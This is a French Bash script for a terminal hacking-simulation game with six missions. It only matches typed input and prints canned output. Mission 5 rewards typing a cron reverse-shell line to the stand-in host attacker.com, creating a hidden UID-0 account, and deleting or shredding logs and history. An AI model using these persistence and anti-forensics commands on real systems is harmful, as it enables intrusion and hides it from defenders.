#!/bin/bash

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Variables globales
SCORE=0
USERNAME="guest"
CURRENT_MISSION=1
STEALTH_LEVEL=0  # 0-100, plus c'est haut, moins vous êtes détectable
DETECTION_RISK=0 # Risque de détection actuel
HISTORY_FILE="/tmp/history.txt"
LOG_FILE="/tmp/security.log"

# Initialisation
init_game() {
    touch $HISTORY_FILE
    echo "=== Début de session ===" > $LOG_FILE
    STEALTH_LEVEL=50
    update_detection_risk
}

# Mise à jour du risque de détection
update_detection_risk() {
    DETECTION_RISK=$((100 - STEALTH_LEVEL))
    if [ $DETECTION_RISK -lt 0 ]; then
        DETECTION_RISK=0
    elif [ $DETECTION_RISK -gt 100 ]; then
        DETECTION_RISK=100
    fi
}

# Fonction pour afficher le menu principal
menu_principal() {
    clear
    echo -e "${GREEN}"
    echo "  _   _            _     _____       _               "
    echo " | | | | __ _  ___| | __|_   _| __ _| | __ ___  ___  "
    echo " | |_| |/ _\` |/ __| |/ /  | || '__| | |/ _\` \\ \\/ / "
    echo " |  _  | (_| | (__|   <   | || |  | | | (_| |>  <    "
    echo " |_| |_|\\__,_|\\___|_|\\_\\  |_||_|  |_|_|\\__,_/_/\\_\\ "
    echo -e "${NC}"
    echo -e "${CYAN}Score: $SCORE | Niveau de furtivité: $STEALTH_LEVEL% | Risque de détection: $DETECTION_RISK%${NC}"
    echo -e "${YELLOW}1. Commencer une nouvelle partie"
    echo "2. Continuer la partie"
    echo "3. Instructions"
    echo "4. Quitter${NC}"
    echo ""
    read -p "Choisissez une option (1-4): " choix

    case $choix in
        1) init_game; debut_jeu ;;
        2) if [ $CURRENT_MISSION -gt 1 ]; then load_game; else echo -e "${RED}Aucune partie à charger!${NC}"; sleep 1; menu_principal; fi ;;
        3) instructions ;;
        4) exit 0 ;;
        *) echo -e "${RED}Option invalide!${NC}"; sleep 1; menu_principal ;;
    esac
}

# Sauvegarde de la partie
save_game() {
    echo "$SCORE $CURRENT_MISSION $USERNAME $STEALTH_LEVEL" > .savegame
    echo -e "${GREEN}Partie sauvegardée!${NC}"
}

# Chargement de la partie
load_game() {
    if [ -f .savegame ]; then
        read SCORE CURRENT_MISSION USERNAME STEALTH_LEVEL < .savegame
        update_detection_risk
        case $CURRENT_MISSION in
            1) debut_jeu ;;
            2) mission2 ;;
            3) mission3 ;;
            4) mission4 ;;
            5) mission5 ;;
            6) mission6 ;;
        esac
    else
        echo -e "${RED}Aucune sauvegarde trouvée!${NC}"
        sleep 1
        menu_principal
    fi
}

# Fonction pour afficher les instructions
instructions() {
    clear
    echo -e "${YELLOW}=== INSTRUCTIONS ==="
    echo -e "${NC}"
    echo "Vous êtes un hacker éthique engagé pour tester la sécurité d'un système."
    echo "Vous devrez résoudre des énigmes et utiliser des commandes Linux pour:"
    echo "- Trouver des mots de passe cachés"
    echo "- Cracker des codes"
    echo "- Exploiter des vulnérabilités simulées"
    echo "- Couvrir vos traces"
    echo ""
    echo -e "${CYAN}=== MÉCANIQUES DU JEU ==="
    echo -e "${NC}"
    echo -e "${GREEN}Système de Score:${NC} Gagnez des points pour chaque mission accomplie"
    echo -e "${GREEN}Furtivité:${NC} Certaines actions augmentent votre visibilité"
    echo -e "${GREEN}Mini-jeux:${NC} Cracking, puzzles logiques, etc."
    echo -e "${GREEN}Missions:${NC} 6 missions progressives avec des objectifs variés"
    echo ""
    echo -e "${RED}Attention:${NC} Si votre risque de détection atteint 100%, vous êtes découvert!"
    echo ""
    read -p "Appuyez sur Entrée pour retourner au menu..." nul
    menu_principal
}

# Fonction pour le début du jeu
debut_jeu() {
    CURRENT_MISSION=1
    clear
    echo -e "${BLUE}=== MISSION 1: ACCÈS INITIAL ==="
    echo -e "${NC}"
    echo "Objectif: Trouver un accès initial au système"
    echo "Indice: Le mot de passe pour l'utilisateur 'guest' est caché dans ce répertoire."
    echo ""
    echo -e "${CYAN}Commandes utiles: ls, cat, grep, cd${NC}"
    echo -e "${PURPLE}Bonus: Trouvez le fichier caché pour des points supplémentaires${NC}"
    echo ""
    
    while true; do
        read -p "$USERNAME@system:~$ " cmd arg1 arg2
        
        # Journalisation de la commande
        echo "$cmd $arg1 $arg2" >> $HISTORY_FILE
        
        case $cmd in
            "ls")
                if [ -z "$arg1" ]; then
                    echo "bienvenue.txt  journal.txt  public_html"
                elif [ "$arg1" == "-a" ]; then
                    echo ".  ..  .cache.txt  .secret  bienvenue.txt  journal.txt  public_html"
                    STEALTH_LEVEL=$((STEALTH_LEVEL - 5))
                    update_detection_risk
                else
                    echo "ls: impossible d'accéder à '$arg1': Aucun fichier ou dossier de ce type"
                fi
                ;;
            "cat")
                if [ "$arg1" == "bienvenue.txt" ]; then
                    echo "Bienvenue dans le système. Rien à voir ici."
                elif [ "$arg1" == "journal.txt" ]; then
                    echo "Fichier journal: accès refusé"
                elif [ "$arg1" == ".cache.txt" ]; then
                    echo -e "${GREEN}Mot de passe trouvé! Le mot de passe guest est: 5up3rS3cur3${NC}"
                    SCORE=$((SCORE + 50))
                    USERNAME="guest"
                    echo ""
                    read -p "Appuyez sur Entrée pour continuer..." nul
                    mission2
                    return
                elif [ "$arg1" == ".secret" ]; then
                    echo -e "${GREEN}BONUS: Vous avez trouvé un fichier secret! +30 points${NC}"
                    echo "Le développeur a laissé un mot de passe ici: dev123"
                    SCORE=$((SCORE + 30))
                else
                    echo "cat: $arg1: Aucun fichier ou dossier de ce type"
                fi
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: ls, cat, exit, stealth, score, clear" ;;
        esac
        
        # Vérifier si détecté
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Mini-jeu de cracking de mot de passe
password_cracking_game() {
    local password="SECRET"
    local attempts=3
    local success=0
    
    echo -e "${YELLOW}=== MINI-JEU: CRACKING DE MOT DE PASSE ==="
    echo -e "${NC}"
    echo "Un fichier protégé par mot de passe a été trouvé."
    echo "Vous avez $attempts tentatives pour le cracker."
    echo "Indice: C'est en majuscules, 5 lettres."
    echo ""
    
    while [ $attempts -gt 0 ]; do
        read -p "Essai $((4 - attempts))/$attempts: " guess
        if [ "$guess" == "$password" ]; then
            success=1
            break
        else
            echo -e "${RED}Incorrect!${NC}"
            # Donner un indice
            if [ $attempts -eq 2 ]; then
                echo "Indice: Commence par 'S'"
            elif [ $attempts -eq 1 ]; then
                echo "Indice: Se termine par 'T'"
            fi
            attempts=$((attempts - 1))
        fi
    done
    
    if [ $success -eq 1 ]; then
        echo -e "${GREEN}Mot de passe cracké avec succès! +40 points${NC}"
        SCORE=$((SCORE + 40))
        return 0
    else
        echo -e "${RED}Échec du cracking. Le fichier reste verrouillé.${NC}"
        STEALTH_LEVEL=$((STEALTH_LEVEL - 15))
        update_detection_risk
        return 1
    fi
}

# Mission 2: Élévation de privilèges
mission2() {
    CURRENT_MISSION=2
    clear
    echo -e "${BLUE}=== MISSION 2: ÉLÉVATION DE PRIVILÈGES ==="
    echo -e "${NC}"
    echo "Objectif: Obtenir les privilèges d'administrateur"
    echo "Indice: Vérifiez les fichiers de configuration et les binaires avec SUID."
    echo ""
    echo -e "${CYAN}Commandes utiles: find, ls -l, cat, sudo -l${NC}"
    echo -e "${PURPLE}Bonus: Trouvez une méthode alternative pour +50 points${NC}"
    echo ""
    
    while true; do
        read -p "$USERNAME@system:~$ " cmd arg1 arg2 arg3
        
        echo "$cmd $arg1 $arg2 $arg3" >> $HISTORY_FILE
        
        case $cmd in
            "ls")
                if [ "$arg1" == "-l" ]; then
                    echo "-r-xr-xr-x 1 root root   45 juin  1 12:00 config.cfg"
                    echo "-rwsr-xr-x 1 root root   15 juin  1 12:00 suid_script.sh"
                    echo "-rw-r--r-- 1 root root   30 juin  1 12:00 backup.txt"
                    echo "-r-------- 1 root root   80 juin  1 12:00 protected.txt"
                else
                    echo "config.cfg  suid_script.sh  backup.txt  protected.txt"
                fi
                ;;
            "cat")
                if [ "$arg1" == "backup.txt" ]; then
                    echo -e "${GREEN}Mot de passe admin trouvé: m0tD3P4ss3Adm1n!${NC}"
                    echo -e "${GREEN}Utilisez 'su admin' pour devenir administrateur. +70 points${NC}"
                    SCORE=$((SCORE + 70))
                elif [ "$arg1" == "suid_script.sh" ]; then
                    echo "#!/bin/bash"
                    echo "cat /etc/shadow"
                    echo -e "${YELLOW}Ce script semble dangereux!${NC}"
                elif [ "$arg1" == "config.cfg" ]; then
                    echo "Fichier de configuration système. Ne pas modifier."
                elif [ "$arg1" == "protected.txt" ]; then
                    if password_cracking_game; then
                        echo "Félicitations! Vous avez accès au fichier protégé."
                        echo "Voici un autre mot de passe: AdminPass123"
                        SCORE=$((SCORE + 50))
                    fi
                else
                    echo "cat: $arg1: Aucun fichier ou dossier de ce type"
                fi
                ;;
            "su")
                if [ "$arg1" == "admin" ]; then
                    read -s -p "Password: " pass
                    echo ""
                    if [ "$pass" == "m0tD3P4ss3Adm1n!" ] || [ "$pass" == "AdminPass123" ]; then
                        USERNAME="admin"
                        echo -e "${GREEN}Élévation de privilèges réussie!${NC}"
                        echo ""
                        read -p "Appuyez sur Entrée pour continuer..." nul
                        mission3
                        return
                    else
                        echo -e "${RED}Mot de passe incorrect!${NC}"
                        STEALTH_LEVEL=$((STEALTH_LEVEL - 10))
                        update_detection_risk
                    fi
                fi
                ;;
            "sudo")
                if [ "$arg1" == "-l" ]; then
                    echo "Matching Defaults entries for $USERNAME on this host:"
                    echo "    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin"
                    echo ""
                    echo "User $USERNAME may run the following commands on this host:"
                    echo "    (ALL) NOPASSWD: /usr/bin/less"
                    echo -e "${YELLOW}Indice: Peut-être pouvez-vous exploiter cette permission...${NC}"
                fi
                ;;
            "find")
                if [ "$arg1" == "/" ] && [ "$arg2" == "-perm" ] && [ "$arg3" == "-4000" ]; then
                    echo "/usr/bin/suid_script.sh"
                    echo "/bin/mount"
                    echo "/bin/umount"
                    echo "/bin/ping"
                fi
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: ls, cat, su, sudo, find, exit, stealth, score, clear" ;;
        esac
        
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Mission 3: Pivotement
mission3() {
    CURRENT_MISSION=3
    clear
    echo -e "${BLUE}=== MISSION 3: PIVOTEMENT ==="
    echo -e "${NC}"
    echo "Objectif: Accéder au réseau interne et trouver des informations sensibles"
    echo "Indice: Recherchez des fichiers cachés ou des historiques de commandes."
    echo ""
    echo -e "${CYAN}Commandes utiles: history, grep, ifconfig, ssh, nc${NC}"
    echo -e "${PURPLE}Bonus: Trouvez le fichier caché contenant des identifiants SSH pour +80 points${NC}"
    echo ""
    
    while true; do
        read -p "$USERNAME@system:~# " cmd arg1 arg2 arg3
        
        echo "$cmd $arg1 $arg2 $arg3" >> $HISTORY_FILE
        
        case $cmd in
            "history")
                echo "  1  cd /var/log"
                echo "  2  cat auth.log | grep ssh"
                echo "  3  ssh -i /tmp/key.pem internal@192.168.1.100"
                echo "  4  rm -f /tmp/key.pem"
                echo "  5  nc -lvnp 4444"
                ;;
            "grep")
                if [ "$arg1" == "ssh" ] && [ "$arg2" == "/var/log/auth.log" ]; then
                    echo "Connexions SSH récentes depuis 192.168.1.100 avec clé privée"
                    echo "Tentative de connexion avec clé invalide depuis 192.168.1.100"
                fi
                ;;
            "ifconfig")
                echo "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500"
                echo "        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255"
                echo "        ether 00:0c:29:12:34:56  txqueuelen 1000  (Ethernet)"
                ;;
            "ssh")
                if [ "$arg1" == "-i" ] && [ "$arg2" == "/tmp/id_rsa" ] && [ "$arg3" == "internal@192.168.1.100" ]; then
                    echo -e "${GREEN}Accès au réseau interne réussi! +100 points${NC}"
                    SCORE=$((SCORE + 100))
                    echo ""
                    read -p "Appuyez sur Entrée pour continuer..." nul
                    mission4
                    return
                else
                    echo "Permission denied (publickey)."
                fi
                ;;
            "find")
                if [ "$arg1" == "/" ] && [ "$arg2" == "-name" ] && [ "$arg3" == "id_rsa" ]; then
                    echo "/home/internal/.ssh/id_rsa"
                    echo "/tmp/id_rsa (copie)"
                fi
                ;;
            "cat")
                if [ "$arg1" == "/home/internal/.ssh/id_rsa" ]; then
                    echo -e "${GREEN}BONUS: Clé SSH trouvée! +80 points${NC}"
                    echo "-----BEGIN RSA PRIVATE KEY-----"
                    echo "MIIEogIBAAKCAQEAr4t9J..."
                    echo "..."
                    echo "-----END RSA PRIVATE KEY-----"
                    SCORE=$((SCORE + 80))
                elif [ "$arg1" == "/tmp/id_rsa" ]; then
                    echo "-----BEGIN RSA PRIVATE KEY-----"
                    echo "MIIEogIBAAKCAQEAr4t9J..."
                    echo "..."
                    echo "-----END RSA PRIVATE KEY-----"
                fi
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: history, grep, ifconfig, ssh, find, cat, exit, stealth, score, clear" ;;
        esac
        
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Mission 4: Exploitation Web
mission4() {
    CURRENT_MISSION=4
    clear
    echo -e "${BLUE}=== MISSION 4: EXPLOITATION WEB ==="
    echo -e "${NC}"
    echo "Objectif: Exploiter une vulnérabilité web pour obtenir un shell"
    echo "Indice: Inspectez le serveur web sur le port 8080"
    echo ""
    echo -e "${CYAN}Commandes utiles: curl, nc, ls, cat${NC}"
    echo -e "${PURPLE}Bonus: Trouvez une vulnérabilité zero-day pour +150 points${NC}"
    echo ""
    
    while true; do
        read -p "$USERNAME@internal:~$ " cmd arg1 arg2 arg3
        
        echo "$cmd $arg1 $arg2 $arg3" >> $HISTORY_FILE
        
        case $cmd in
            "curl")
                if [ "$arg1" == "http://localhost:8080" ]; then
                    echo "<html><body><h1>Bienvenue sur le serveur interne</h1>"
                    echo "<form action='/execute' method='GET'>"
                    echo "Commande: <input type='text' name='cmd'>"
                    echo "<input type='submit' value='Exécuter'>"
                    echo "</form></body></html>"
                elif [[ "$arg1" == "http://localhost:8080/execute?cmd="* ]]; then
                    cmd_to_exec=${arg1#*=}
                    if [ "$cmd_to_exec" == "id" ]; then
                        echo "uid=1001(webapp) gid=1001(webapp) groups=1001(webapp)"
                    elif [ "$cmd_to_exec" == "ls" ]; then
                        echo "index.html"
                        echo "config.php"
                        echo "backup.zip"
                    elif [ "$cmd_to_exec" == "cat config.php" ]; then
                        echo "<?php"
                        echo "\$db_host = 'localhost';"
                        echo "\$db_user = 'admin';"
                        echo "\$db_pass = 'DBP@ssw0rd!';"
                        echo "?>"
                        echo -e "${GREEN}Identifiants de base de données trouvés! +90 points${NC}"
                        SCORE=$((SCORE + 90))
                    else
                        echo "Commande exécutée avec le compte webapp"
                    fi
                fi
                ;;
            "nc")
                if [ "$arg1" == "-lvnp" ] && [ "$arg2" == "4444" ]; then
                    echo "En écoute sur 0.0.0.0 4444"
                    sleep 2
                    echo -e "${GREEN}Shell distant obtenu! Vous pouvez maintenant exécuter des commandes. +120 points${NC}"
                    SCORE=$((SCORE + 120))
                    echo ""
                    read -p "Appuyez sur Entrée pour continuer..." nul
                    mission5
                    return
                fi
                ;;
            "exploit")
                echo -e "${GREEN}Zero-day exploité avec succès! +150 points${NC}"
                SCORE=$((SCORE + 150))
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: curl, nc, exploit, exit, stealth, score, clear" ;;
        esac
        
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Mission 5: Post-exploitation
mission5() {
    CURRENT_MISSION=5
    clear
    echo -e "${BLUE}=== MISSION 5: POST-EXPLOITATION ==="
    echo -e "${NC}"
    echo "Objectif: Maintenir l'accès et effacer vos traces"
    echo "Indice: Créez un compte caché et nettoyez les logs"
    echo ""
    echo -e "${CYAN}Commandes utiles: useradd, passwd, echo, rm, shred${NC}"
    echo -e "${PURPLE}Bonus: Créez une backdoor persistante pour +200 points${NC}"
    echo ""
    
    while true; do
        read -p "root@internal:~# " cmd arg1 arg2 arg3
        
        echo "$cmd $arg1 $arg2 $arg3" >> $HISTORY_FILE
        
        case $cmd in
            "useradd")
                if [ "$arg1" == "-o" ] && [ "$arg2" == "-u" ] && [ "$arg3" == "0" ]; then
                    echo -e "${GREEN}Compte root caché créé! +100 points${NC}"
                    SCORE=$((SCORE + 100))
                fi
                ;;
            "passwd")
                echo "Changing password for user $arg1."
                echo "New password: [hidden]"
                echo "Retype new password: [hidden]"
                echo "passwd: password updated successfully"
                ;;
            "echo")
                if [[ "$arg1" == "* * * * * root /bin/bash -i >& /dev/tcp/attacker.com/443 0>&1"* ]]; then
                    echo -e "${GREEN}Backdoor persistante configurée! +200 points${NC}"
                    SCORE=$((SCORE + 200))
                fi
                ;;
            "rm")
                if [ "$arg1" == "-f" ] && [ "$arg2" == "$LOG_FILE" ]; then
                    echo -e "${GREEN}Logs effacés! +80 points${NC}"
                    SCORE=$((SCORE + 80))
                    STEALTH_LEVEL=$((STEALTH_LEVEL + 30))
                    update_detection_risk
                fi
                ;;
            "shred")
                if [ "$arg1" == "-u" ] && [ "$arg2" == "-z" ] && [ "$arg3" == "$HISTORY_FILE" ]; then
                    echo -e "${GREEN}Historique sécurisé effacé! +50 points${NC}"
                    SCORE=$((SCORE + 50))
                    STEALTH_LEVEL=$((STEALTH_LEVEL + 20))
                    update_detection_risk
                fi
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: useradd, passwd, echo, rm, shred, exit, stealth, score, clear" ;;
        esac
        
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Mission 6: Défi Final
mission6() {
    CURRENT_MISSION=6
    clear
    echo -e "${BLUE}=== MISSION 6: DÉFI FINAL ==="
    echo -e "${NC}"
    echo "Objectif: Crackez le chiffrement pour révéler le message secret"
    echo "Indice: C'est un chiffrement par décalage (ROT)"
    echo ""
    echo "Message chiffré: 'Gur cnffjbeq vf 5yy8r7pl8'"
    echo ""
    echo -e "${CYAN}Utilisez la commande 'decrypt' pour essayer de déchiffrer${NC}"
    echo -e "${PURPLE}Bonus: Trouvez sans indice pour +300 points${NC}"
    echo ""
    
    while true; do
        read -p "root@internal:~# " cmd arg1
        
        echo "$cmd $arg1" >> $HISTORY_FILE
        
        case $cmd in
            "decrypt")
                if [ "$arg1" == "Gur cnffjbeq vf 5yy8r7pl8" ]; then
                    echo "Le message utilise ROT13. Essayez 'decrypt ROT13'"
                elif [ "$arg1" == "ROT13" ]; then
                    echo -e "${GREEN}Message déchiffré: 'The password is 5ll8e7cy8'${NC}"
                    echo -e "${GREEN}Félicitations! Vous avez complété toutes les missions! +300 points${NC}"
                    SCORE=$((SCORE + 300))
                    echo ""
                    echo -e "${YELLOW}=== SCORE FINAL: $SCORE ==="
                    echo "Niveau de furtivité final: $STEALTH_LEVEL%"
                    echo "Merci d'avoir joué!${NC}"
                    echo ""
                    read -p "Appuyez sur Entrée pour retourner au menu principal..." nul
                    menu_principal
                    return
                fi
                ;;
            "exit") save_game; menu_principal; return ;;
            "stealth") 
                echo -e "${CYAN}Niveau de furtivité: $STEALTH_LEVEL%"
                echo "Risque de détection: $DETECTION_RISK%${NC}"
                ;;
            "score") echo -e "${YELLOW}Votre score actuel: $SCORE${NC}" ;;
            "clear") clear ;;
            *) echo "Commande non reconnue. Essayez: decrypt, exit, stealth, score, clear" ;;
        esac
        
        if [ $DETECTION_RISK -ge 100 ]; then
            echo -e "${RED}ALERTE: Vous avez été détecté! La mission a échoué.${NC}"
            sleep 2
            menu_principal
            return
        fi
    done
}

# Démarrer le jeu
menu_principal